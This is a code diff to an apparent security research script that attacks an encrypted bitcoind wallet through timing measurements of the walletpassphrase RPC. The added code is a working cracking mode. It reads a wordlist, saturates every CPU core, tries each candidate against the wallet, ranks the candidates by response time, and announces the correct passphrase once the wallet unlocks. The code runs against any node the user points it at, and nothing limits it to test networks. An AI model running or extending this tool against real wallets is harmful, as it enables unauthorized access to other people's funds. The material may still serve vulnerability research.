@@ -30,7 +30,8 @@ Modules:
   2. CPU load generation (configurable busy-wait threads per load level)
   3. Gap amplification measurement (valid_mean / invalid_mean per load)
   4. Candidate scoring via timing oracle under load
-  5. JSON report generation
+  5. Wordlist-based candidate scoring under 100% CPU load
+  6. JSON report generation
 
 Requires: Python 3, requests (or stdlib http.client), running bitcoind
           with an encrypted wallet (regtest or testnet).
@@ -535,6 +536,72 @@ def score_candidates(host: str, port: int, rpc_user: str, rpc_pass: str,
 
 
 # ═══════════════════════════════════════════════════════════════════
+# Section 7b — Wordlist-based candidate scoring (no known-correct needed)
+# ═══════════════════════════════════════════════════════════════════
+
+def score_candidates_from_file(host: str, port: int, rpc_user: str,
+                               rpc_pass: str, candidates: List[str],
+                               num_samples: int,
+                               wallet: Optional[str] = None,
+                               verbose: bool = False) -> Tuple[List[Dict[str, Any]], Optional[str]]:
+    """Score candidate passphrases under 100% CPU load using response time ranking.
+
+    Under full CPU contention the correct passphrase triggers the full
+    CCrypter::Decrypt path (AES-CBC + PKCS#7 padding validation) which is
+    disproportionately slowed compared to the short-circuit invalid path.
+    The candidate with the longest mean response time is the most likely
+    to be correct.
+
+    Returns (ranked_list, found_passphrase_or_None).
+    """
+    scored: List[Dict[str, Any]] = []
+    found_correct: Optional[str] = None
+
+    loader = CPULoadGenerator(1.0, verbose=verbose)
+    loader.start()
+    time.sleep(2.0)  # let load stabilise
+
+    total = len(candidates)
+    for idx, cand in enumerate(candidates):
+        # Progress every 500 candidates
+        if (idx + 1) % 500 == 0 or idx == 0:
+            print(f'  [*] Progress: {idx + 1}/{total} candidates scored...')
+
+        cand_ns = collect_timing_samples(
+            host, port, rpc_user, rpc_pass, cand,
+            num_samples, wallet=wallet, verbose=False)
+
+        cand_mean = statistics.mean(cand_ns) if cand_ns else 0
+
+        scored.append({
+            'candidate': cand,
+            'mean_ns': cand_mean,
+            'mean_ms': cand_mean / 1e6,
+        })
+
+        # Check if the wallet actually unlocked (correct passphrase found)
+        # We detect this by making a walletpassphrase call and checking the
+        # response — call_raw_timing already re-locks on success, but we
+        # need to check if any sample succeeded.
+        # A simple heuristic: try once more and inspect the RPC response.
+        unlock_check = _rpc_call(host, port, rpc_user, rpc_pass,
+                                 'walletpassphrase', [cand, 1], wallet=wallet)
+        if unlock_check.get('error') is None:
+            # Wallet unlocked — this is the correct passphrase!
+            _relock(host, port, rpc_user, rpc_pass, wallet)
+            found_correct = cand
+            print(f'\n  [!!!] CORRECT PASSPHRASE FOUND: "{cand}"')
+            print(f'        Wallet unlocked successfully. Stopping scoring.')
+            break
+
+    loader.stop()
+
+    # Sort by descending mean response time (longest = most likely correct)
+    scored.sort(key=lambda x: x['mean_ns'], reverse=True)
+    return scored, found_correct
+
+
+# ═══════════════════════════════════════════════════════════════════
 # Section 8 — JSON report generation
 # ═══════════════════════════════════════════════════════════════════
 
@@ -543,7 +610,8 @@ def generate_report(node_version: Optional[str],
                     cpu_count: int,
                     load_results: List[Dict[str, Any]],
                     candidate_scores: Optional[List[Dict[str, Any]]],
-                    output_path: str) -> None:
+                    output_path: str,
+                    candidate_ranking: Optional[List[Dict[str, Any]]] = None) -> None:
     """Write comprehensive JSON report."""
     # Determine amplification
     gap_ratios = [r['gap_ratio'] for r in load_results
@@ -579,6 +647,17 @@ def generate_report(node_version: Optional[str],
                 'p_value': cs['p_value'],
             })
 
+    # Serialise candidate ranking from file-based scoring
+    ranking_summary = None
+    if candidate_ranking:
+        ranking_summary = []
+        for cr in candidate_ranking:
+            ranking_summary.append({
+                'candidate': cr['candidate'],
+                'mean_ns': cr['mean_ns'],
+                'mean_ms': cr['mean_ms'],
+            })
+
     report = {
         'finding': FINDING_ID,
         'related_finding': ENTROPY_FINDING,
@@ -595,6 +674,7 @@ def generate_report(node_version: Optional[str],
         'gap_ratio_warning_threshold': GAP_RATIO_WARNING,
         'gap_ratio_critical_threshold': GAP_RATIO_CRITICAL,
         'candidate_scores': cand_summary,
+        'candidate_ranking': ranking_summary,
     }
 
     with open(output_path, 'w') as f:
@@ -665,6 +745,13 @@ def main():
                              '(default: __INVALID_PROBE_XYZ)')
     parser.add_argument('--candidates', nargs='+', type=str, default=None,
                         help='Candidate passphrases to score via timing oracle')
+    parser.add_argument('--candidates-file', type=str, default=None,
+                        help='Path to a wordlist file (one candidate per line). '
+                             'Enables file-based candidate scoring under 100%% '
+                             'CPU load, bypassing gap measurement phases.')
+    parser.add_argument('--ranking-output', type=str, default='candidate_ranking.txt',
+                        help='Output file for the full ranked candidate list '
+                             '(default: candidate_ranking.txt)')
 
     # Measurement parameters
     parser.add_argument('--samples', type=int, default=30,
@@ -691,17 +778,6 @@ def main():
 
     # ── Determine CPU count ──
     cpu_count = os.cpu_count() or multiprocessing.cpu_count()
-    print(f'  [*] CPU cores detected: {cpu_count}')
-    print(f'  [*] Load levels to test: {[f"{l:.0%}" for l in load_fractions]}')
-    print(f'  [*] Samples per level: {args.samples}')
-    print(f'  [*] Load stabilisation: {args.load_duration}s')
-    print(f'  [*] Invalid probe: "{args.invalid_probe}"')
-    if args.known_correct:
-        print(f'  [*] Known-correct passphrase provided: YES')
-    else:
-        print(f'  [!] No known-correct passphrase provided')
-        print(f'      Gap amplification cannot be fully quantified.')
-        print(f'      Only invalid-timing gradient will be measured.')
 
     # ── Check node connectivity ──
     print(f'\n  {"═" * 58}')
@@ -731,6 +807,129 @@ def main():
     else:
         print(f'  [!] Could not retrieve wallet info')
         wallet_info = {}
+
+    # ══════════════════════════════════════════════════════════════
+    # BRANCH: --candidates-file mode (wordlist scoring under 100% load)
+    # ══════════════════════════════════════════════════════════════
+    if args.candidates_file:
+        # Read wordlist
+        try:
+            with open(args.candidates_file, 'r', encoding='utf-8',
+                       errors='replace') as f:
+                file_candidates = [line.strip() for line in f
+                                   if line.strip()]
+        except FileNotFoundError:
+            print(f'  [!!] ERROR: Candidates file not found: '
+                  f'{args.candidates_file}')
+            sys.exit(1)
+        except Exception as e:
+            print(f'  [!!] ERROR reading candidates file: {e}')
+            sys.exit(1)
+
+        print(f'\n  {"═" * 58}')
+        print(f'  WORDLIST CANDIDATE SCORING MODE')
+        print(f'  {"═" * 58}')
+        print(f'  [*] CPU cores detected: {cpu_count}')
+        print(f'  [*] Candidates file: {args.candidates_file}')
+        print(f'  [*] Candidates loaded: {len(file_candidates)}')
+        print(f'  [*] Samples per candidate: {args.samples}')
+        print(f'  [*] CPU load: 100% (all {cpu_count} cores)')
+        print(f'  [*] Ranking output: {args.ranking_output}')
+        if args.known_correct:
+            print(f'  [*] Known-correct provided (will highlight if found)')
+        print(f'\n  [*] Starting candidate scoring under full CPU load...\n')
+
+        file_ranking, found = score_candidates_from_file(
+            args.rpc_host, args.rpc_port, args.rpc_user, args.rpc_pass,
+            file_candidates, args.samples,
+            wallet=args.rpc_wallet, verbose=args.verbose)
+
+        # ── Print TOP CANDIDATES table ──
+        top_n = min(20, len(file_ranking))
+        print(f'\n  {"═" * 58}')
+        print(f'  TOP CANDIDATES (by mean response time, descending)')
+        print(f'  {"═" * 58}')
+        print(f'  {"Rank":<6}{"Candidate":<30}{"Mean (ms)":<14}{"Marker"}')
+        print(f'  {"─" * 62}')
+        for rank, cr in enumerate(file_ranking[:top_n], 1):
+            cand_display = cr['candidate'][:27]
+            if len(cr['candidate']) > 27:
+                cand_display += '...'
+            marker = ''
+            if found and cr['candidate'] == found:
+                marker = ' ★ CORRECT'
+            elif args.known_correct and cr['candidate'] == args.known_correct:
+                marker = ' ★ KNOWN-CORRECT'
+            print(f'  {rank:<6}{cand_display:<30}{cr["mean_ms"]:<14.3f}{marker}')
+        print(f'  {"─" * 62}')
+        if found:
+            print(f'  ★ = confirmed correct passphrase (wallet unlocked)')
+        else:
+            print(f'  Longest response time = most likely correct '
+                  f'(full CCrypter::Decrypt path)')
+
+        # ── Save full ranked list ──
+        ranking_path = args.ranking_output
+        try:
+            with open(ranking_path, 'w') as rf:
+                rf.write(f'# Candidate Ranking — {FINDING_ID}\n')
+                rf.write(f'# Scored under 100% CPU load, '
+                         f'{args.samples} samples per candidate\n')
+                rf.write(f'# Sorted by descending mean response time\n')
+                rf.write(f'# Total candidates: {len(file_ranking)}\n')
+                if found:
+                    rf.write(f'# CORRECT PASSPHRASE FOUND: {found}\n')
+                rf.write(f'#\n')
+                rf.write(f'{"# Rank":<8}{"Candidate":<40}{"Mean_ns":<18}'
+                         f'{"Mean_ms":<14}\n')
+                for rank, cr in enumerate(file_ranking, 1):
+                    rf.write(f'  {rank:<8}{cr["candidate"]:<40}'
+                             f'{cr["mean_ns"]:<18.0f}{cr["mean_ms"]:<14.3f}\n')
+            print(f'\n  [*] Full ranked list saved to: {ranking_path}')
+        except Exception as e:
+            print(f'  [!] Failed to write ranking file: {e}')
+
+        # ── JSON report (if requested) ──
+        if args.output_json:
+            print(f'\n  {"═" * 58}')
+            print(f'  JSON REPORT')
+            print(f'  {"═" * 58}')
+            generate_report(
+                node_version, wallet_info, cpu_count,
+                [],  # no load_results in file-scoring mode
+                None,  # no legacy candidate_scores
+                args.output_json,
+                candidate_ranking=file_ranking)
+
+        # ── Final summary ──
+        print(f'\n  {"═" * 58}')
+        print(f'  ANALYSIS COMPLETE')
+        print(f'  {"═" * 58}')
+        print(f'  Finding:              {FINDING_ID}')
+        print(f'  Mode:                 Wordlist candidate scoring')
+        print(f'  Candidates scored:    {len(file_ranking)}')
+        print(f'  Top candidate:        "{file_ranking[0]["candidate"]}" '
+              f'({file_ranking[0]["mean_ms"]:.3f} ms)')
+        if found:
+            print(f'  CORRECT PASSPHRASE:   "{found}"')
+        print(f'  Ranking saved to:     {ranking_path}')
+        print(f'  {"═" * 58}')
+        return
+
+    # ══════════════════════════════════════════════════════════════
+    # ORIGINAL MODE: Gap amplification measurement
+    # ══════════════════════════════════════════════════════════════
+    print(f'\n  [*] CPU cores detected: {cpu_count}')
+    print(f'  [*] Load levels to test: {[f"{l:.0%}" for l in load_fractions]}')
+    print(f'  [*] Samples per level: {args.samples}')
+    print(f'  [*] Load stabilisation: {args.load_duration}s')
+    print(f'  [*] Invalid probe: "{args.invalid_probe}"')
+    if args.known_correct:
+        print(f'  [*] Known-correct passphrase provided: YES')
+    else:
+        print(f'  [!] No known-correct passphrase provided')
+        print(f'      Gap amplification cannot be fully quantified.')
+        print(f'      Only invalid-timing gradient will be measured.')
 
     # ── Phase 1: Measure gap at each load level ──
     print(f'\n  {"═" * 58}')
